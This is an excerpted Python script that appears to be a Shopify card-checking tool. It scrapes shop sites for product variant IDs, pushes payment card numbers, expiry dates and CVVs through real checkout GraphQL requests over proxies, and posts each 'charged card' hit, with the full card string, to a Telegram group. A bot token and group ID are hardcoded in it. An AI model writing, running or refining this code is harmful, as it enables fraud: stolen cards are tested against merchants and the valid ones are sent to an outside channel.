...
TELEGRAM_BOT_TOKEN = os.getenv("BOT_TOKEN", "6721837907:AAG8NYYLoyKZ-BbcHcKiZImbCFUWWbA9Fu0")
TELEGRAM_GROUP_ID = os.getenv("GROUP_ID", "-1003737740461")
...
async def fetch_products(domain, proxy_str=None):
    ...
    async with aiohttp.ClientSession(connector=connector, timeout=REQUEST_TIMEOUT) as session:
        ...
        try:
            async with session.get(f"{domain}/products.json?limit=50", proxy=proxy, headers=headers) as resp:
                if resp.status == 200:
        ...
        # Method 2: Scrape homepage for product handles, visit product pages
        try:
            async with session.get(domain, proxy=proxy, headers=headers) as resp:
                if resp.status == 200:
                    ...
                    for handle in list(handles)[:8]:
                        # Try product JSON
                        try:
                            async with session.get(f"{domain}/products/{handle}.json", proxy=proxy, headers=headers) as p_resp:
                        ...
                        # Scrape product page HTML
                        try:
                            async with session.get(f"{domain}/products/{handle}", proxy=proxy, headers=headers) as p_resp:
                                if p_resp.status == 200:
                                    ...
                                    m = re.search(r'"variantId"\s*:\s*(\d+)', p_html)
                                    if m:
                                        return {'variant_id': m.group(1), 'price': '0.00'}

                                    ld_scripts = re.findall(r'<script type="application/ld\+json">(.*?)</script>', p_html, re.DOTALL)
                                            ...
                                            if ld.get('@type') == 'Product':
                                                ...
                                                for o in offers:
                                                    ...
                                                    if sku and str(sku).isdigit():
                                                        return {'variant_id': str(sku), 'price': '0.00'}
                                        except Exception:
                                            continue

                                    m = re.search(r'variants"\s*:\s*(\[.*?\])', p_html, re.DOTALL)
                                    if m:
                                        try:
                                    ...
                                    m = re.search(r'"current_variant"\s*:\s*\{[^}]*"id"\s*:\s*(\d+)', p_html)
                                    if m:
                                        return {'variant_id': m.group(1), 'price': '0.00'}
        ...
        try:
            async with session.get(f"{domain}/collections/all/products.json?limit=50", proxy=proxy, headers=headers) as resp:
                if resp.status == 200:
                    text = await resp.text()
                    if text.strip().startswith('{'):
                        data = json.loads(text)
        ...
        # Method 4: Sitemap
        try:
            async with session.get(f"{domain}/sitemap.xml", proxy=proxy, headers=headers) as resp:
                if resp.status == 200:
                    xml = await resp.text()
                    product_urls = re.findall(r'<loc>(.*?/products/[^<]+)</loc>', xml)
...
async def graphql_post(session, url, params, headers, json_data, proxy=None):
    try:
        async with session.post(url, params=params, headers=headers, json=json_data, proxy=proxy) as resp:
            text = await resp.text()
            if resp.status != 200:
                return None, f'HTTP {resp.status}: {text[:100]}', False
...
async def send_hit_to_telegram(cc_string, site, gateway, price, currency, response_msg):
    ...
    message_text = f"""🔥 <b>{bs('HIT: Charged Card')}</b> 🔥
<b>━━━━━━━━━━━━━━━━━</b>
...
async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
    ...
    try:
        ...
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            ...
            response, resp_text, _ = await graphql_post(session, graphql_url, params, headers, json_data, proxy)
            if not response:
                return False, f"Shipping proposal failed: {resp_text}", gateway, total_price, currency
            ...
            try:
                ...
                return False, f"Invalid JSON: {str(e)}", gateway, total_price, currency
            ...
            response, text, _ = await graphql_post(session, graphql_url, params, headers, submit_json_data, proxy)
            ...
            try:
                ...
                return False, f"Invalid JSON submit: {text[:100]}", gateway, total_price, currency
            except Exception as e:
                return False, f"Submit error: {str(e)}", gateway, total_price, currency
            ...
            for i in range(5):
                response, final_text, _ = await graphql_post(session, graphql_url, params, headers, poll_json_data, proxy)
...
def shopify_checker():
    try:
        ...
        hit_keywords = [
            ...
            'order confirmed', 'approved', 'success', 'completed'
        ]
        is_hit = any(kw in clean_lower for kw in hit_keywords)
        if 'otp' in clean_lower or '3d_secure' in clean_lower or '3ds' in clean_lower:
            is_hit = True

        if is_hit and success:
            try:
                asyncio.run(send_hit_to_telegram(cc_string, site, gateway, price, currency, clean_response))
            except Exception:
                pass
